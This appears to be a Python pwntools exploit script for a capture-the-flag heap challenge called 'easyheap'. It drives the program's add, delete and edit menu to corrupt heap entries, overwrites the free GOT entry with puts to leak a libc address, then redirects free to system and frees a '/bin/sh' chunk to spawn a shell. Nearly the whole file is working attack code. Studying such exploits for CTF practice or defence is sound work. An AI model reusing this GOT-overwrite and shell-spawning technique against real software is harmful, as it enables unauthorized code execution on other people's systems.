#coding:utf-8

from pwn import *

context.log_level = 'debug'

debug = 1

def wpAdd(r, length, message):
	r.recvuntil('Your choice:\n')
	r.send('1'.ljust(9, '\x00'))

	r.recvuntil('How long is this message?\n')
	r.send(str(length).ljust(9, '\x00'))

	r.recvuntil('What is the content of the message?\n')
	r.send(message)

	
def wpDel(r, index):
	r.recvuntil('Your choice:\n')
	r.send('2'.ljust(9, '\x00'))
	
	r.recvuntil('What is the index of the item to be deleted?\n')
	r.send(str(index).ljust(9, '\x00'))


def wpEdit(r, index, info):
	r.recvuntil('Your choice:\n')
	r.send('3'.ljust(9, '\x00'))

	r.recvuntil('What is the index of the item to be modified?\n')
	r.send(str(index).ljust(9, '\x00'))

	r.recvuntil('What is the content of the message?\n')
	r.send(info)

def wpAddWithout(r):
	r.recvuntil('Your choice:\n')
	r.send('1'.ljust(9, '\x00'))

	r.recvuntil('How long is this message?\n')
	r.send(str(0x40000).ljust(9, '\x00'))

def exp(debug):
	elf = ELF('./easyheap')
	if(debug == 1):
		r = process('./easyheap')
		lib = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		#gdb.attach(r, 'b *0x0000000000400B3E')
	else:
		lib = ELF('./libc.so.6')


	wpAdd(r, 0x30, 'a')	#index:0
	wpAdd(r, 0x30, 'a')	#index:1
	wpAdd(r, 0x40, 'a')	#index:2
	wpDel(r, 2)	
	wpDel(r, 0)		
	wpDel(r, 1)
	
		

	wpAddWithout(r) 	#index:0
	wpAddWithout(r)		#index:1
	wpAddWithout(r)
	
	wpEdit(r, 1, p64(0) + p64(21) + p64(elf.got['free']) + p64(8))
	#-----------------------修改更改次数
	wpEdit(r, 0, p64(0) + p64(21) + p64(0x00000000006020AC) + p64(8))
	wpEdit(r, 1, '\x00\x00\x00\xff' + '\x00\x00\x00\xff')

	#---------------------修改free的plt-----------------------------
	wpEdit(r, 0, p64(0) + p64(21) + p64(elf.got['free']) + p64(8))
	wpEdit(r, 1, p64(elf.plt['puts']))
	
	wpEdit(r, 0, p64(0) + p64(21) + p64(elf.got['puts']))
	wpDel(r, 1)
	
	lib_base = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00')) - lib.sym['puts']
	log.info('lib => %#x'%lib_base)


	wpEdit(r, 2, p64(lib_base + lib.sym['system']))
	wpAdd(r, 0x30, '/bin/sh\x00')			#index:1
	wpDel(r, 1)
	
	r.interactive()


exp(debug)
